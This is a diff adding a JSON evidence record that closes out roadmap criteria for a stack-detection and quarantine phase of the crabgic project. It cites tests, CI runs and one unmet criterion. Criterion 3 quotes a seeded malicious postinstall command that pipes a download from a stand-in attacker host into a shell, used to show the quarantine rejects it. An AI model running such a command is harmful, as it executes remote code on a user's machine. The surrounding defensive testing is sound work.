@@ -1,0 +1,287 @@
+{
+  "schemaVersion": 1,
+  "phase": "12",
+  "roadmapFile": "roadmap/12-stack-detection-quarantine.md",
+  "pass": {
+    "date": "2026-08-01",
+    "agent": "criteria-closeout pass, batch 0 (pilot)",
+    "headSha": "2ff3bce9e8d23a622fb293b81c92abf6cc10f4f7"
+  },
+  "criteria": [
+    {
+      "index": 1,
+      "text": "Fixture matrix (node/ts monorepo, python, go, rust, mixed, containerized) yields expected `StackEvidence` profiles; contradictions surfaced on conflicting fixtures.",
+      "textSha256": "547ad3d0ccfcfada9acf517094c825ae5ab18b2b88af6cddc8b11d82214bcb57",
+      "classification": "EVIDENCE-EXISTS",
+      "ticked": true,
+      "citations": [
+        {
+          "kind": "ci-run",
+          "ref": "CI / unit-test+coverage (ubuntu-latest), job 91399985018, step \"test with 80% line+branch coverage gate\"",
+          "url": "https://github.com/WitchyNibbles/crabgic/actions/runs/30711622357",
+          "commit": "4f2b33bbf68f517643a8d4f8eb5f85c793e99e3f",
+          "quotedAssertion": "job log line 466 — '  ✓  @crabgic/detect  src/evidence-builder.test.ts (9 tests) 21ms'; line 474 — '  ✓  @crabgic/detect  src/contradiction.test.ts (5 tests) 5ms'; run summary ' Test Files  612 passed (612)' / '      Tests  5881 passed | 1 skipped (5882)'"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/evidence-builder.test.ts:36",
+          "quotedAssertion": "packages/detect/src/evidence-builder.test.ts:36 — 'expect(manifestPaths).toEqual([\"package.json\", \"packages/a/package.json\", \"packages/b/package.json\"]);' — the node/ts monorepo profile is asserted, not merely that detection ran"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/evidence-builder.test.ts:51",
+          "quotedAssertion": "packages/detect/src/evidence-builder.test.ts:51-52 — 'expect(evidence.contradictions).toHaveLength(1); expect(evidence.contradictions[0]?.conflictingPaths.length).toBeGreaterThanOrEqual(2);' — the \"contradictions surfaced on conflicting fixtures\" clause, on the conflicting-`engines.node` fixture the roadmap names verbatim"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/evidence-builder.test.ts:95",
+          "quotedAssertion": "packages/detect/src/evidence-builder.test.ts:95 — 'expect(ecosystems).toEqual(new Set([\"node\", \"python\"]));' — the mixed fixture; `:65` (python migrations), `:75` (go directive 1.23), `:85` (rust edition 2021), `:105-108` (container + terraform) cover the remaining named fixtures"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/evidence-builder.test.ts:31",
+          "quotedAssertion": "packages/detect/src/evidence-builder.test.ts:31 — 'expect(StackEvidenceSchema.safeParse(evidence).success).toBe(true);' and :124 'StackEvidenceSchema.parse(JSON.parse(JSON.stringify(evidence)))' — the emitted profile is 02's schema, not a look-alike shape"
+        },
+        {
+          "kind": "artifact",
+          "ref": "docs/evidence/phase-12/closeout-c1-fixture-matrix.txt",
+          "quotedAssertion": "'Test Files 12 passed (12) / Tests 54 passed (54)' — scoped local re-run at the closeout commit, command line recorded in the file header"
+        }
+      ],
+      "notes": "The 7th fixture case (:111) points detection at a nonexistent root and asserts `unresolvedAmbiguity.length > 0` with zero findings, so the \"expected profile\" assertions above cannot pass by producing nothing."
+    },
+    {
+      "index": 2,
+      "text": "No-execution proof: detectors run under a no-exec jail test that fails if any child process spawns.",
+      "textSha256": "b54d387b782a34d7e39e3739f78ed2d1ec48396965232c9d17f4509d84d45b74",
+      "classification": "EVIDENCE-EXISTS",
+      "ticked": true,
+      "citations": [
+        {
+          "kind": "ci-run",
+          "ref": "CI / unit-test+coverage (ubuntu-latest), job 91399985018, step \"test with 80% line+branch coverage gate\"",
+          "url": "https://github.com/WitchyNibbles/crabgic/actions/runs/30711622357",
+          "commit": "4f2b33bbf68f517643a8d4f8eb5f85c793e99e3f",
+          "quotedAssertion": "job log line 473 — '  ✓  @crabgic/detect  src/no-exec-jail.test.ts (1 test) 161ms'; line 469 — '  ✓  @crabgic/detect  src/spawn-surface-scan.test.ts (4 tests) 11ms'"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/no-exec-jail.test.ts:58",
+          "quotedAssertion": "packages/detect/src/no-exec-jail.test.ts:58 — 'expect(recordedCalls.names).toEqual([]);' after a full `buildStackEvidence` pass over `buildMaliciousPostinstallFixture()`, with `node:child_process`'s spawn/spawnSync/exec/execSync/execFile/execFileSync/fork all wrapped to record every call (:33-42). This is the fails-if-any-child-process-spawns jail the criterion names."
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/no-exec-jail.test.ts:62",
+          "quotedAssertion": "packages/detect/src/no-exec-jail.test.ts:62 — 'expect(evidence.findings.some((f) => f.category === \"manifest\")).toBe(true);' — the anti-vacuity guard: a detection pass that saw nothing would make the zero-calls assertion meaningless, so the test also proves the pass really analysed the fixture."
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/spawn-surface-scan.test.ts:62",
+          "quotedAssertion": "packages/detect/src/spawn-surface-scan.test.ts:62/:71/:81 — 'expect(offenders).toEqual([]);' for (a) any `node:child_process`/`child_process` import, (b) any `shell: true`, (c) any bare `spawn`/`exec`/`execFile`/`fork` call, scanned across every non-test source file of the package; :85 'expect(ALL_SOURCE_FILES.length).toBeGreaterThan(10);' guards against an empty glob certifying the absence."
+        },
+        {
+          "kind": "artifact",
+          "ref": "docs/evidence/phase-12/closeout-c2-no-exec-jail.txt",
+          "quotedAssertion": "'Test Files 2 passed (2) / Tests 5 passed (5)' — scoped local re-run at the closeout commit"
+        }
+      ]
+    },
+    {
+      "index": 3,
+      "text": "Quarantine catches seeded threats: malicious postinstall, secret in skill body, over-broad plugin hook, unsigned digest change.",
+      "textSha256": "56066894880901b8849e750a9966bdc35e589d1864116163323c75f9b5371fca",
+      "classification": "EVIDENCE-EXISTS",
+      "ticked": true,
+      "citations": [
+        {
+          "kind": "ci-run",
+          "ref": "CI / unit-test+coverage (ubuntu-latest), job 91399985018, step \"test with 80% line+branch coverage gate\"",
+          "url": "https://github.com/WitchyNibbles/crabgic/actions/runs/30711622357",
+          "commit": "4f2b33bbf68f517643a8d4f8eb5f85c793e99e3f",
+          "quotedAssertion": "job log line 464 — '  ✓  @crabgic/detect  src/quarantine/pipeline.test.ts (10 tests) 16ms'; the same step's log also names src/quarantine/stages/scan-stage.test.ts, src/quarantine/stages/verify-provenance.test.ts and the three scanner suites"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/quarantine/pipeline.test.ts:46",
+          "quotedAssertion": "packages/detect/src/quarantine/pipeline.test.ts:46-54 (malicious postinstall, `curl http://evil.example.com | sh`) — 'expect(report.stages.map((s) => s.stage)).toEqual([\"fetch\",\"pin\",\"verify_provenance\",\"scan\"]); expect(report.decision).toBe(\"rejected\"); expect(manifestEntry).toBeUndefined(); expect(report.scanFindings.some((f) => f.severity === \"critical\")).toBe(true);'"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/quarantine/pipeline.test.ts:64",
+          "quotedAssertion": "packages/detect/src/quarantine/pipeline.test.ts:64-65 (secret in skill body, an AKIA-style key inside SKILL.md) — 'expect(report.stages.at(-1)?.stage).toBe(\"scan\"); expect(report.decision).toBe(\"rejected\");'; :75-76 the same shape for the unscoped `Bash(*)` plugin hook"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/quarantine/pipeline.test.ts:83",
+          "quotedAssertion": "packages/detect/src/quarantine/pipeline.test.ts:83-84 (unsigned digest change) — 'expect(report.stages.map((s) => s.stage)).toEqual([\"fetch\",\"pin\",\"verify_provenance\"]); expect(report.decision).toBe(\"rejected\");' — rejected AT the provenance stage, so the ordering is asserted too, not just the verdict"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/quarantine/pipeline.test.ts:13",
+          "quotedAssertion": "packages/detect/src/quarantine/pipeline.test.ts:15-22 — the benign control: 'expect(report.stages.map((s) => s.stage)).toEqual(PIPELINE_STAGES); expect(report.decision).toBe(\"pending\"); expect(manifestEntry).toMatchObject({...})'. Without it, a pipeline that rejected everything would satisfy all four threat cases."
+        },
+        {
+          "kind": "artifact",
+          "ref": "docs/evidence/phase-12/closeout-c3-seeded-threats.txt",
+          "quotedAssertion": "'Test Files 10 passed (10) / Tests 45 passed (45)' — scoped local re-run at the closeout commit"
+        }
+      ],
+      "notes": "Scope, recorded so the tick is not read as wider than it is: `docs/evidence/phase-12/README.md` §Carry-forward (c) documents that the three scanners are regex/heuristic stand-ins, not real gitleaks/osv-scanner/Syft binaries, and that a non-seeded variant can pass stage 4. This criterion names four specific seeded threats and this box evidences exactly those four."
+    },
+    {
+      "index": 4,
+      "text": "Approved capability is digest-pinned in the manifest under `capability-store/`; a changed digest or permission footprint forces re-audit.",
+      "textSha256": "e3ceb00501a7cdd7f8a2976d421fe43fa3a5bb5174d7384a066144ff3d1cb12f",
+      "classification": "EVIDENCE-EXISTS",
+      "ticked": true,
+      "citations": [
+        {
+          "kind": "ci-run",
+          "ref": "CI / unit-test+coverage (ubuntu-latest), job 91399985018, step \"test with 80% line+branch coverage gate\"",
+          "url": "https://github.com/WitchyNibbles/crabgic/actions/runs/30711622357",
+          "commit": "4f2b33bbf68f517643a8d4f8eb5f85c793e99e3f",
+          "quotedAssertion": "job log line 465 — '  ✓  @crabgic/detect  src/capability-store/store.test.ts (10 tests) 21ms'; line 476 — '  ✓  @crabgic/detect  src/capability-store/reaudit.test.ts (4 tests) 14ms'; line 481 — '  ✓  @crabgic/detect  src/capability-store/key.property.test.ts (4 tests) 51ms'"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/capability-store/layout.test.ts:9",
+          "quotedAssertion": "packages/detect/src/capability-store/layout.test.ts:9-11 — 'expect(resolveCapabilityStoreDir(ENV, \"abc123\")).toBe(\"/home/eimi/.cache/crabgic/abc123/capability-store\");' — the \"under `capability-store/`\" clause, at the exact path interface-ledger Gap 14 pins"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/capability-store/store.test.ts:40",
+          "quotedAssertion": "packages/detect/src/capability-store/store.test.ts:40 — 'expect(saved.key).toBe(computeCapabilityStoreKey(report.digest, report.permissionFootprint));' — the entry is content-addressed by (digest, permission footprint); :57-62 then flips it to \"approved\" and asserts the digest-carrying manifest entry follows, on disk, across a reopened store"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/capability-store/reaudit.test.ts:55",
+          "quotedAssertion": "packages/detect/src/capability-store/reaudit.test.ts:55-56 — 'expect(decision.requiresReaudit).toBe(true); expect(decision.reason).toContain(\"digest changed\");' and :67-68 'expect(decision.requiresReaudit).toBe(true); expect(decision.reason).toContain(\"permission footprint changed\");' — both halves of the re-audit clause, against a real saved prior audit"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/capability-store/reaudit.test.ts:42",
+          "quotedAssertion": "packages/detect/src/capability-store/reaudit.test.ts:42 — 'expect(decision.requiresReaudit).toBe(false);' when neither changed. The negative control: without it, a checker that always demanded re-audit would satisfy both positive cases."
+        },
+        {
+          "kind": "artifact",
+          "ref": "docs/evidence/phase-12/closeout-c4-digest-pin-reaudit.txt",
+          "quotedAssertion": "'Test Files 8 passed (8) / Tests 56 passed (56)' — scoped local re-run at the closeout commit"
+        }
+      ],
+      "notes": "Re-verified 2026-08-01 after rebasing onto the current main: #49 (feat(detect): journal capability-quarantine verdicts) added audit-journal coverage to this criterion's suites and shifted several line numbers, so every citation here was re-resolved against the rebased tree and the transcript re-captured. The cited CI run is green at 4f2b33b, the branch point; the closeout PR's own CI run covers the rebased tree."
+    },
+    {
+      "index": 5,
+      "text": "`capability.audit`/`capability.approve` resolve over the shared `crabgic_gateway` registry against a stub MCP client; `capability.approve` rejects a call lacking a pre-minted `trust approve` token.",
+      "textSha256": "e8b54f58b6b7016c4db5e2da275824bbdb324b198517b0e8a88d3b887c5f68f4",
+      "classification": "UNMET",
+      "ticked": false,
+      "citations": [
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/mcp/capability-approve-handler.test.ts:93",
+          "quotedAssertion": "packages/detect/src/mcp/capability-approve-handler.test.ts:93-95 — 'expect(result.approved).toBe(false); expect(store.load(saved.key)?.report.decision).toBe(\"pending\"); expect(journal.entries).toHaveLength(0);' for a fabricated, never-minted token — no approval, no state change, and (since #49) no journal entry either. PARTIAL evidence: this closes the criterion's SECOND clause only."
+        },
+        {
+          "kind": "test",
+          "ref": "packages/cli/src/gateway-mcp/build-tool-registry.test.ts:138",
+          "quotedAssertion": "packages/cli/src/gateway-mcp/build-tool-registry.test.ts:138 — 'expect([...realRegistry().toolNames].sort()).toEqual([...EXPECTED_TOOL_NAMES].sort());' with `capability.audit`/`capability.approve` in EXPECTED_TOOL_NAMES (:122-123); executed by CI run 30711622357, job log '  ✓  crabgic  src/gateway-mcp/build-tool-registry.test.ts (16 tests) 204ms'. PARTIAL: registry membership, never crossing the MCP transport the first clause names."
+        }
+      ],
+      "defectRef": "docs/evidence/criteria-closeout/defects/12-capability-tools-stub-mcp-client.md",
+      "notes": "The criterion's own named evidence (`packages/detect/src/mcp/tool-definitions.test.ts`, per docs/evidence/phase-12/README.md) was relocated in 5c21a0f and deleted in c39292c with the hand-rolled stdio server it drove; its `tools/list` assertion was never re-established against the MCP SDK server that replaced it. No test at HEAD resolves either capability tool over an MCP client. Full search trail in the defect record."
+    },
+    {
+      "index": 6,
+      "text": "CLI `trust review|approve|revoke` replaces 09's `NOT_IMPLEMENTED` stub end-to-end against a real supervisor in a tmp dir.",
+      "textSha256": "71d96ff8e2a0b1bfdda584ca61b6d596019d517325f74b2ad2b3cd754cdd3ef8",
+      "classification": "WORDING-MISMATCH",
+      "ticked": true,
+      "citations": [
+        {
+          "kind": "ci-run",
+          "ref": "CI / unit-test+coverage (ubuntu-latest), job 91399985018, step \"test with 80% line+branch coverage gate\"",
+          "url": "https://github.com/WitchyNibbles/crabgic/actions/runs/30711622357",
+          "commit": "4f2b33bbf68f517643a8d4f8eb5f85c793e99e3f",
+          "quotedAssertion": "job log line 467 — '  ✓  @crabgic/detect  src/trust/trust-commands.test.ts (7 tests) 138ms'; and, for the CLI half, '  ✓  crabgic  src/commands/trust-dispatch.test.ts (4 tests) 12ms'"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/cli/src/commands/trust-dispatch.test.ts:74",
+          "quotedAssertion": "packages/cli/src/commands/trust-dispatch.test.ts:74-77 — 'expect(result.exitCode).toBe(EXIT_OK); expect(result.stdout).toContain(\"no capability audits\");' — the @crabgic/detect backend's own empty-store wording, which the NOT_IMPLEMENTED stub can never emit"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/cli/src/commands/trust-dispatch.test.ts:126",
+          "quotedAssertion": "packages/cli/src/commands/trust-dispatch.test.ts:126 — 'expect(result.exitCode).toBe(EXIT_NOT_IMPLEMENTED);' for all three commands when `deps.trust` is absent. This is what makes the tick mean \"the routing replaced the stub\" rather than \"the stub was never there\"."
+        },
+        {
+          "kind": "test",
+          "ref": "packages/cli/src/commands/trust-dispatch.test.ts:41",
+          "quotedAssertion": "packages/cli/src/commands/trust-dispatch.test.ts:41-43 — 'connectClient: () => { throw new Error(\"not needed for this test\"); }' with every trust command still returning EXIT_OK: direct evidence that no supervisor is on this command family's path (see wordingCorrection)"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/trust/trust-commands.test.ts:107",
+          "quotedAssertion": "packages/detect/src/trust/trust-commands.test.ts:107 — 'full flow: audit -> trust review lists it pending -> trust approve mints a token -> capability.approve verifies it -> trust revoke reverts it', against a real on-disk capability store in a tmp dir, a real ApprovalTokenMinter and a real on-disk approval ledger"
+        },
+        {
+          "kind": "test",
+          "ref": "e2e/live/src/cliNotImplementedSweep.test.ts:103",
+          "quotedAssertion": "e2e/live/src/cliNotImplementedSweep.test.ts:103 — 'expect(wiring.trustWired).toBe(true);' against the real `buildRealCliDependencies` composition root, i.e. the SHIPPED binary supplies deps.trust (packages/cli/src/bootstrap.ts:302). This file is in e2e/live's offline default project; the @live suites are src/live/*.live.test.ts and were not run."
+        },
+        {
+          "kind": "artifact",
+          "ref": "docs/evidence/phase-12/closeout-c6-trust-cli.txt",
+          "quotedAssertion": "'Test Files 2 passed (2) / Tests 11 passed (11)' — scoped local re-run at the closeout commit"
+        },
+        {
+          "kind": "artifact",
+          "ref": "docs/evidence/phase-12/closeout-c6-production-wiring.txt",
+          "quotedAssertion": "'Test Files 1 passed (1) / Tests 15 passed (15)' — e2e/live's offline cliNotImplementedSweep suite, scoped local re-run at the closeout commit"
+        }
+      ],
+      "wordingCorrection": {
+        "before": "CLI `trust review|approve|revoke` replaces 09's `NOT_IMPLEMENTED` stub end-to-end against a real supervisor in a tmp dir.",
+        "after": "CLI `trust review|approve|revoke` replaces 09's `NOT_IMPLEMENTED` stub end-to-end, in a tmp dir. No supervisor participates: `trust *` has no supervisor path at all — its backend is a local on-disk capability store plus an in-process HMAC minter, per 09's own recorded decision that the minter is legitimately in-process-scoped (docs/evidence/phase-09/README.md, \"#6 approval-token cross-process durability\"). The absence is asserted rather than assumed: trust-dispatch.test.ts:41-43 supplies a `connectClient` that throws, and all three commands still return EXIT_OK."
+      },
+      "notes": "The \"against a real supervisor\" phrase is inherited from this phase's own §Test plan, which introduces it as \"(mirrors 09's own convention)\" rather than as a property of `trust *`. The correction is more precise, not weaker: the guarantee the box carries — the argv command reaches the real backend end-to-end in a tmp dir instead of the stub, and the shipped binary wires it — is fully evidenced above. Original wording preserved verbatim in the phase file, per the wording protocol."
+    },
+    {
+      "index": 7,
+      "text": "Doc-research task-packet generator degrades gracefully when invoked before phase 11's drafting flow exists (typed fallback, no crash).",
+      "textSha256": "b2de2911b9d413ce6debe7134a17083c82fc2fac40b766b934c0d247e4346994",
+      "classification": "EVIDENCE-EXISTS",
+      "ticked": true,
+      "citations": [
+        {
+          "kind": "ci-run",
+          "ref": "CI / unit-test+coverage (ubuntu-latest), job 91399985018, step \"test with 80% line+branch coverage gate\"",
+          "url": "https://github.com/WitchyNibbles/crabgic/actions/runs/30711622357",
+          "commit": "4f2b33bbf68f517643a8d4f8eb5f85c793e99e3f",
+          "quotedAssertion": "job log — '  ✓  @crabgic/detect  src/doc-research/generator.test.ts (5 tests) 9ms'; run summary ' Test Files  612 passed (612)' / '      Tests  5881 passed | 1 skipped (5882)'"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/doc-research/generator.test.ts:14",
+          "quotedAssertion": "packages/detect/src/doc-research/generator.test.ts:14-15 — 'expect(result.status).toBe(\"degraded\"); expect(result.packet.topic).toBe(INPUT.topic);' with no consumer supplied: a TYPED fallback that still carries the packet, which is the criterion's \"typed fallback\" clause"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/doc-research/generator.test.ts:41",
+          "quotedAssertion": "packages/detect/src/doc-research/generator.test.ts:41 — 'await expect(generateDocResearchPacket(INPUT)).resolves.toBeDefined();' — the explicit \"no crash\" clause"
+        },
+        {
+          "kind": "test",
+          "ref": "packages/detect/src/doc-research/generator.test.ts:23",
+          "quotedAssertion": "packages/detect/src/doc-research/generator.test.ts:23/:34 — 'expect(result.status).toBe(\"submitted\")' with a sync and an async consumer. The non-degraded control: without it, a function that always returned \"degraded\" would satisfy the criterion vacuously. :45 further proves malformed input still rejects rather than degrading silently."
+        },
+        {
+          "kind": "artifact",
+          "ref": "docs/evidence/phase-12/closeout-c7-doc-research.txt",
+          "quotedAssertion": "'Test Files 2 passed (2) / Tests 8 passed (8)' — scoped local re-run at the closeout commit"
+        }
+      ]
+    }
+  ]
+}
